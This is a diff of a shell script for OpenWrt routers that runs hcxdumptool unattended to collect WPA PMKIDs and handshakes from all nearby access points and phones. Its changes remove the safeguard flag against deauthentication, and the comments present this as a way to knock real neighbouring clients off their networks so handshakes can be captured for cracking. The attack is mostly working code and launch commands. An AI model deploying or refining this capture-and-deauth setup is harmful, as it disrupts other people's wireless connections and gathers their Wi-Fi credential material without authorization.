@@ -1,6 +1,6 @@
 #!/bin/sh
 # ============================================================
-# hcx_autocap 自动空闲射频抓包版 (v2610)
+# hcx_autocap 自动空闲射频抓包版 (v2611)
 # ============================================================
 # 适用机型与固件版本:
 #   Netgear R6220   (op22, mips/MT7621,   hcxdumptool 6.2.4)
@@ -8,16 +8,16 @@
 #   Redmi AC2100    (op23.05, mips/MT7621, hcxdumptool 6.3.4)
 #   以及各类运行官方 OpenWrt 19.07 ~ 25.12+ 的主流无线路由器
 #
-# 现代化升级说明 (2026-10 升级重构):
-#   1. 【彻底拔除假信标与踢线毒牙】:
+# 现代化升级说明 (2026-10 升级重构 v2611):
+#   1. 【拔除假信标污染，恢复主动 Deauth 握手捕获】:
 #      - 彻底清除 6.2.x 下的 `--active_beacon` 广播发射标志，绝不向空口发射虚假
-#        热点信标，杜绝空域热点拥堵、全楼手机假热点弹窗与无线电干扰投诉；
-#      - 封死 `--disable_deauthentication`，绝不向空中正在通信的真实终端发送断开连接帧，
-#        彻底杜绝踢线断网与 802.11w/PMF 告警。
+#        热点信标，杜绝空域热点拥堵与全楼手机假热点弹窗骚扰；
+#      - 移除 `--disable_deauthentication`，恢复标准主动去认证重连诱导，大幅提升
+#        四次握手（M1~M4）获取成功率，解决纯被动模式下长时间漏包/无握手问题。
 #   2. 【升级受控双轨主动加速收割】(hcxdumptool >= 6.3.x):
 #      - `--attemptapmax=3`: 对跳频发现的周围所有 AP 单播索取 PMKID (最多3轮)，
 #        无需现场有手机连网，半夜无人也能秒级收割 PMKID；
-#      - `--attemptclientmax=3`: 对空中侦测到的真实活跃手机单播轻敲 3 次 (抗空口丢包波动)，
+#      - `--attemptclientmax=3`: 对空中侦测到的真实活跃手机轻敲触发重连 (抗空口丢包波动)，
 #        加速握手获取，若无响应第 3 次后立刻停手，绝不持续骚扰；
 #      - 适配频段约束信道表 (`CH_2G_NEW` / `CH_5G_NEW`)，杜绝单频 PHY 驱动报 EINVAL 闪退；
 #      - `--disable_beacon` / `--disable_proberequest`: 严禁广播假信标与探针骚扰。
@@ -55,7 +55,7 @@ SCRIPT_FILE=$(basename "$0" 2>/dev/null)
 SCRIPT_BASE="${SCRIPT_FILE%.*}"
 [ -z "${SCRIPT_BASE}" ] && SCRIPT_BASE="hcx_autocap"
 SCRIPT_NAME="${SCRIPT_FILE}"
-SCRIPT_VER="v2610"
+SCRIPT_VER="v26.10.1"
 
 case "$1" in
     -v|--version)
@@ -97,10 +97,10 @@ CH_6G_NEW="5c,21c,37c,53c,69c,85c,101c,117c"
 # 方言: auto(默认, 自动探测) | new(6.3.x: -w -c ...) | legacy(6.2.x: -o -c ...)
 # 设成 new/legacy 是【优先】而不是【只用】: 它起不来时脚本仍会往下走尝试阶梯
 # (换方言 / 同方言去可选参数)。脚本可能被设成开机自启、无人值守, 所以一律尽力自己搞定。
-# 主动加速参数控制(可由环境变量覆盖; 默认开启安全双轨受控主动加速)
-# ATTEMPT_AP_MAX: 对周围每个扫描到的 AP 主动单播索取 PMKID 的最大轮数(0=不主动索取, 推荐 3)
+# 主动加速参数控制(可由环境变量覆盖; 默认开启受控 Deauth 强制重连)
+# ATTEMPT_AP_MAX: 对周围每个扫描到的 AP 主动单播索取 PMKID 的最大轮数(0=不主动索取, 默认 3)
 ATTEMPT_AP_MAX="${ATTEMPT_AP_MAX:-3}"
-# ATTEMPT_CLIENT_MAX: 对空中活跃客户端单播轻触促发握手的最大次数(0=纯静默被动不碰客户端, 默认 3=抗空口丢包波动轻敲3次即止, 配合--disable_deauthentication安全无感)
+# ATTEMPT_CLIENT_MAX: 对空中活跃客户端定向发送 Deauth 触发重连的最大次数(默认 3=定向轻敲3次抗丢包, 收到握手即止)
 ATTEMPT_CLIENT_MAX="${ATTEMPT_CLIENT_MAX:-3}"
 
 HCX_DIALECT="${HCX_DIALECT:-auto}"
@@ -308,7 +308,7 @@ detect_hcx_dialect() {
     log "  帮助文本特征: -w=${_has_w} -o=${_has_o} -F=${_has_F} --bpf=${_has_bpf} --bpfc=${_has_bpfc}"
     if [ "${HCX_MODE}" = "new" ]
     then
-        log "  抓包命令(双轨受控主动加速): ${HCX_BIN} -i <接口> -w <pcapng> -c <频段信道表> --attemptapmax=${ATTEMPT_AP_MAX} --attemptclientmax=${ATTEMPT_CLIENT_MAX} --disable_beacon --disable_proberequest --disable_deauthentication"
+        log "  抓包命令(双轨主动加速+去认证): ${HCX_BIN} -i <接口> -w <pcapng> -c <频段信道表> --attemptapmax=${ATTEMPT_AP_MAX} --attemptclientmax=${ATTEMPT_CLIENT_MAX} --disable_beacon --disable_proberequest"
     else
         log "  抓包命令(单播PMKID): ${HCX_BIN} -i <接口> -c <信道表> -o <pcapng> --enable_status=15"
     fi
@@ -1071,12 +1071,13 @@ hcx_launch() {
     out="$2"
     lf="$3"
     eval "bd=\$BAND_${drv}"
+
     # 命令行形态由阶梯决定: full=全参 / reduced=去可选参数(legacy 去 -c, new 兜底降参)
     case "${HCX_MODE}" in
         new)
-            # 彻底拔除假信标广播与断网踢线: 封死 deauth 踢线 / proberequest / beacon 广播
-            # 保留受控微量单播重关联诱导: 允许向活跃手机单播轻敲最多 3 次促发握手 (抗空口波动, 受 attemptclientmax=3 严格约束)
-            _active_opts="--attemptapmax=${ATTEMPT_AP_MAX} --attemptclientmax=${ATTEMPT_CLIENT_MAX} --disable_beacon --disable_proberequest --disable_deauthentication"
+            # 拔除假信标广播，全程启用受控 Deauth 强制重连诱导:
+            # 允许单播向活跃终端定向轻敲触发重连以秒级捕获四次握手，同时严格封死假信标广播与假探针骚扰
+            _active_opts="--attemptapmax=${ATTEMPT_AP_MAX} --attemptclientmax=${ATTEMPT_CLIENT_MAX} --disable_beacon --disable_proberequest"
             _bpf_opt=""
             _bpf_tag=""
             if [ "${_has_bpf}" = "1" ] && [ -f "${BPF_FILE}" ] && [ "${HCX_VARIANT}" != "reduced" ]
@@ -1100,20 +1101,20 @@ hcx_launch() {
                 if [ -n "${_chs_new}" ]
                 then
                     _form="new-chan-min"
-                    _vdesc="new/降级(-c ${_btag}/安全防扰)"
+                    _vdesc="new/降级(-c ${_btag}/Deauth重连)"
                 else
                     _form="new-min"
-                    _vdesc="new/兜底降级(无信道表/安全防扰)"
+                    _vdesc="new/兜底降级(无信道表/Deauth重连)"
                     _ch_range="跳频中 (全信道)"
                 fi
             else
                 if [ -n "${_chs_new}" ]
                 then
                     _form="new-chan"
-                    _vdesc="new/受控双轨主动加速(-c ${_btag}${_bpf_tag}/无假信标/无踢线/微量轻触)"
+                    _vdesc="new/双轨加速(-c ${_btag}${_bpf_tag}/Deauth重连/无假信标)"
                 else
                     _form="new-full"
-                    _vdesc="new/双轨主动加速(-F${_bpf_tag}/无假信标/无踢线/微量轻触)"
+                    _vdesc="new/双轨加速(-F${_bpf_tag}/Deauth重连/无假信标)"
                 fi
             fi
             ;;
@@ -1131,7 +1132,7 @@ hcx_launch() {
                 6G|6g)   _chs=""         ; _btag="6G(legacy不传信道表)" ; _ch_range="跳频中 (全信道)" ;;
                 *)       _chs=""         ; _btag="未知频段" ; _ch_range="跳频中 (全信道)" ;;
             esac
-            # 彻底拔除 --active_beacon 假信标广播，消除空域污染与邻里网络扰动
+            # 彻底拔除 --active_beacon 假信标广播，消除空域污染；保留 Deauth 促发握手
             _flags="--enable_status=15"
             if [ "${HCX_VARIANT}" = "reduced" ]
             then
@@ -1139,7 +1140,7 @@ hcx_launch() {
                 then
                     _chs=""                      # 降参一档: 去掉 -c, 交给工具自己跳频
                     _form="legacy-nochan"
-                    _vdesc="legacy/去-c(${_btag}/无假信标)"
+                    _vdesc="legacy/去-c(${_btag}/Deauth重连/无假信标)"
                     _ch_range="跳频中 (全信道)"
                 else
                     _flags=""                    # 本来就无信道表: 再降一档, 去掉可选标志
@@ -1151,14 +1152,14 @@ hcx_launch() {
                 if [ -n "${_chs}" ]
                 then
                     _form="legacy-chan"
-                    _vdesc="legacy/全参(${_btag}${_bpfc_tag}/无假信标)"
+                    _vdesc="legacy/全参(${_btag}${_bpfc_tag}/Deauth重连/无假信标)"
                     case "${_chs}" in
                         *,*) : ;;
                         *[0-9]*) _ch_range="固定 (信道 ${_chs})" ;;
                     esac
                 else
                     _form="legacy-nochan"
-                    _vdesc="legacy/无信道表(${_btag}${_bpfc_tag}/无假信标)"
+                    _vdesc="legacy/无信道表(${_btag}${_bpfc_tag}/Deauth重连/无假信标)"
                     _ch_range="跳频中 (全信道)"
                 fi
             fi
@@ -1175,15 +1176,13 @@ hcx_launch() {
                 --attemptapmax="${ATTEMPT_AP_MAX}" \
                 --attemptclientmax="${ATTEMPT_CLIENT_MAX}" \
                 --disable_beacon \
-                --disable_proberequest \
-                --disable_deauthentication >> "${lf}" 2>&1 & ;;
+                --disable_proberequest >> "${lf}" 2>&1 & ;;
         new-chan-min)
-            CMDLINE="${HCX_BIN} -i ${drv} -w ${out} -c ${_chs_new} --disable_beacon --disable_proberequest --disable_deauthentication"
+            CMDLINE="${HCX_BIN} -i ${drv} -w ${out} -c ${_chs_new} --disable_beacon --disable_proberequest"
             printf '[%s] 启动命令(形态=%s): %s\n' "$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)" "${_vdesc}" "${CMDLINE}" >> "${lf}"
             "${HCX_BIN}" -i "${drv}" -w "${out}" -c "${_chs_new}" \
                 --disable_beacon \
-                --disable_proberequest \
-                --disable_deauthentication >> "${lf}" 2>&1 & ;;
+                --disable_proberequest >> "${lf}" 2>&1 & ;;
         new-full)
             CMDLINE="${HCX_BIN} -i ${drv} -w ${out} -F ${_bpf_opt} ${_active_opts}"
             printf '[%s] 启动命令(形态=%s): %s\n' "$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)" "${_vdesc}" "${CMDLINE}" >> "${lf}"
@@ -1191,15 +1190,13 @@ hcx_launch() {
                 --attemptapmax="${ATTEMPT_AP_MAX}" \
                 --attemptclientmax="${ATTEMPT_CLIENT_MAX}" \
                 --disable_beacon \
-                --disable_proberequest \
-                --disable_deauthentication >> "${lf}" 2>&1 & ;;
+                --disable_proberequest >> "${lf}" 2>&1 & ;;
         new-min)
-            CMDLINE="${HCX_BIN} -i ${drv} -w ${out} --disable_beacon --disable_proberequest --disable_deauthentication"
+            CMDLINE="${HCX_BIN} -i ${drv} -w ${out} --disable_beacon --disable_proberequest"
             printf '[%s] 启动命令(形态=%s): %s\n' "$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)" "${_vdesc}" "${CMDLINE}" >> "${lf}"
             "${HCX_BIN}" -i "${drv}" -w "${out}" \
                 --disable_beacon \
-                --disable_proberequest \
-                --disable_deauthentication >> "${lf}" 2>&1 & ;;
+                --disable_proberequest >> "${lf}" 2>&1 & ;;
         legacy-chan)
             CMDLINE="${HCX_BIN} -i ${drv} -c ${_chs} -o ${out} ${_bpfc_opt} ${_flags}"
             printf '[%s] 启动命令(形态=%s): %s\n' "$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)" "${_vdesc}" "${CMDLINE}" >> "${lf}"
@@ -1655,9 +1652,9 @@ do
     printf '%s\033[K\n' "================================================================"
     if [ "${HCX_MODE}" = "new" ]
     then
-        _mode_tag="6.3.x 双轨受控主动加速档 (AP*${ATTEMPT_AP_MAX}/Client*${ATTEMPT_CLIENT_MAX}/无假信标/无踢线)"
+        _mode_tag="6.3.x 双轨主动加速收割档 (AP*${ATTEMPT_AP_MAX}/Client-Deauth*${ATTEMPT_CLIENT_MAX}/无假信标)"
     else
-        _mode_tag="6.2.x 原生单播主动PMKID档 (无假信标)"
+        _mode_tag="6.2.x 原生单播主动PMKID+Deauth档 (无假信标)"
     fi
     printf "  [已抓包 %5ss] %d/%d 路存活 | 模式: %s\033[K\n" "${SECS}" "${_live_cnt}" "${NR}" "${_mode_tag}"
     printf "  说明: 文件大小含信标(Beacon); 抓取握手需客户端连网或路由支持PMKID\033[K\n"
